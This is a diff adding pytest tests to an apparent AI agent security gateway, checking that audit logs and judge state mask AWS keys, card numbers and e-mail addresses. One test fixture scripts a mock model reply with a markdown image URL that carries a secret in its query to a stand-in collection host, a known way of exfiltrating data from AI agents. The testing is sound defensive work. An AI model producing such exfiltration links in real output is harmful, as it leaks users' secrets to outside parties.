@@ -301,3 +301,50 @@ def test_agent_can_poll_only_its_own_approval(env) -> None:  # noqa: ANN001
     own = asyncio.run(get(KEY))
     assert own.status_code == 200 and own.json()["status"] == "pending"
     assert asyncio.run(get("bk_test_gateway_pg")).status_code == 404  # another agent cannot see it
+
+
+def test_guard_api_audit_has_no_raw_secret_or_card(env) -> None:  # noqa: ANN001
+    app, _, _ = env
+    secret, card = "AKIAIOSFODNN7EXAMPLE", "4111111111111111"
+    r1 = asyncio.run(_post(app, {"text": f"deploy config: aws_key={secret} card {card}"}, path="/v1/guard/check"))
+    r2 = asyncio.run(_post(app, {"tool_call": {"name": "mail.send", "arguments": {"to": "boss@bank.example", "subject": "s", "body": f"card {card}"}}}, path="/v1/guard/check"))
+    for r in (r1, r2):
+        dumped = json.dumps(app.state.gw.audit.trace(r.json()["trace_id"]))
+        assert secret not in dumped and card not in dumped
+
+
+def test_tool_call_arguments_masked_in_audit_even_without_findings(env) -> None:  # noqa: ANN001
+    app, mock, _ = env
+    card = "4111111111111111"
+    mock.script([{"tool_calls": [{"name": "mail__send", "arguments": {"to": "boss@bank.example", "subject": "case", "body": f"customer card {card}, e-mail jan.k@example.com"}}]}])
+    r = asyncio.run(_post(app, {"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "email the case to my boss"}]}))
+    ev = app.state.gw.audit.get(r.headers["x-bouncer-trace-id"])
+    dumped = json.dumps(ev)
+    assert card not in dumped and "jan.k@example.com" not in dumped
+
+
+def test_exfil_url_query_not_in_evidence(env) -> None:  # noqa: ANN001
+    app, mock, _ = env
+    mock.script([{"content": "Done. ![x](https://collect.example/p?d=ACCOUNT-123456-SECRETVALUE)"}])
+    r = asyncio.run(_post(app, {"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "summarize"}]}))
+    ev = app.state.gw.audit.get(r.headers["x-bouncer-trace-id"])
+    assert "ACCOUNT-123456-SECRETVALUE" not in json.dumps(ev)
+
+
+def test_judge_state_never_contains_raw_values(tmp_path: Path) -> None:
+    from judge.backends.fake import FakeBackend
+
+    os.environ["BOUNCER_KEY_OPS_COPILOT"] = KEY
+    judge = FakeBackend()
+    mock = MockState()
+    app = create_app(
+        Settings(policy_path="policy/bouncer.yaml", audit_path=str(tmp_path / "a.jsonl"), t1="fake", judge_override="fake", watch=False),
+        upstream_transport=httpx.ASGITransport(app=create_mock(mock)),
+        fake_judge=judge,
+    )
+    card = "4111111111111111"
+    mock.script([{"tool_calls": [{"name": "mail__send", "arguments": {"to": "ops@bank.example", "subject": "s", "body": f"card {card}"}}]}])
+    asyncio.run(_post(app, {"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "send ops the case summary, my key is AKIAIOSFODNN7EXAMPLE"}]}))
+    assert judge.calls, "a side-effect tool call goes to the judge"
+    for state, _ in judge.calls:
+        assert card not in json.dumps(state) and "AKIAIOSFODNN7EXAMPLE" not in json.dumps(state)
